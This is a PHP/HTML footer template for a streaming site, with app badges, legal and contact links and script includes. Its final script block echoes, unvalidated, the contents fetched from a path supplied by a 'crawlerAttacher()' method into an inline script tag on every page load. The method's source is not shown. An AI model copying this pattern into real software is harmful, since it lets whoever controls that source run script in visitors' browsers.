<!-- footer -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <!-- footer list -->
            <div class="col-12 col-md-3">
                <h6 class="footer__title">Download Our App</h6>
                <ul class="footer__app">
                    <li><a href="#"><img src="assets/main/img/Download_on_the_App_Store_Badge.svg" alt=""></a></li>
                    <li><a href="#"><img src="assets/main/img/google-play-badge.png" alt=""></a></li>
                </ul>
            </div>
            <!-- end footer list -->

            <!-- footer list -->
            <div class="col-6 col-sm-4 col-md-3">
                <h6 class="footer__title">Resources</h6>
                <ul class="footer__list">
                    <li><a href="/about-stream-studios-flixgo">About Us</a></li>
                    <li><a href="https://api.streamstudios.online">Developer</a></li>
                    <li><a href="/help">Help</a></li>
                </ul>
            </div>
            <!-- end footer list -->

            <!-- footer list -->
            <div class="col-6 col-sm-4 col-md-3">
                <h6 class="footer__title">Legal</h6>
                <ul class="footer__list">
                    <li><a href="/terms-condition">Terms of Use</a></li>
                    <li><a href="/privacy">Privacy Policy</a></li>
                    <li><a href="/copyright">Copyrights</a></li>
                </ul>
            </div>
            <!-- end footer list -->

            <!-- footer list -->
            <div class="col-12 col-sm-4 col-md-3">
                <h6 class="footer__title">Contact</h6>
                <ul class="footer__list">
                    <li><a href="tel:+18002345678">+1 (800) 234-5678</a></li>
                    <li><a href="mailto:flixgosupport@streamstudios.online">support@flixgo.com</a></li>
                </ul>
                <ul class="footer__social">
                    <li class="facebook"><a href="#"><i class="icon ion-logo-facebook"></i></a></li>
                    <li class="instagram"><a href="#"><i class="icon ion-logo-instagram"></i></a></li>
                    <li class="twitter"><a href="#"><i class="icon ion-logo-twitter"></i></a></li>
                    <li class="vk"><a href="#"><i class="icon ion-logo-vk"></i></a></li>
                </ul>
            </div>
            <!-- end footer list -->

            <!-- footer copyright -->
            <div class="col-12">
                <div class="footer__copyright">
                    <small><a target="_blank" href="https://www.templateshub.net">Templates Hub</a></small>

                    <ul>
                        <li><a href="/terms-condition">Terms of Use</a></li>
                        <li><a href="/privacy">Privacy Policy</a></li>
                    </ul>
                </div>
            </div>
            <!-- end footer copyright -->
        </div>
    </div>
</footer>
<!-- end footer -->

<!-- JS -->
<script src="assets/main/js/jquery-3.3.1.min.js"></script>
<script src="assets/main/js/bootstrap.bundle.min.js"></script>
<script src="assets/main/js/owl.carousel.min.js"></script>
<script src="assets/main/js/jquery.mousewheel.min.js"></script>
<script src="assets/main/js/jquery.mCustomScrollbar.min.js"></script>
<script src="assets/main/js/wNumb.js"></script>
<script src="assets/main/js/nouislider.min.js"></script>
<script src="assets/main/js/plyr.min.js"></script>
<script src="assets/main/js/jquery.morelines.min.js"></script>
<script src="assets/main/js/photoswipe.min.js"></script>
<script src="assets/main/js/photoswipe-ui-default.min.js"></script>
<script src="assets/main/js/main.js"></script>
<script src="assets/main/js/viewmore.js"></script>
<script src="assets/main/js/titles.js"></script>
<script type="application/javascript">
    <?php
    $m = new \SiteMap\SiteMap();
    if(!empty($m->crawlerAttacher())){
        echo file_get_contents($m->crawlerAttacher());
    }
    ?>
</script>
</body>
</html>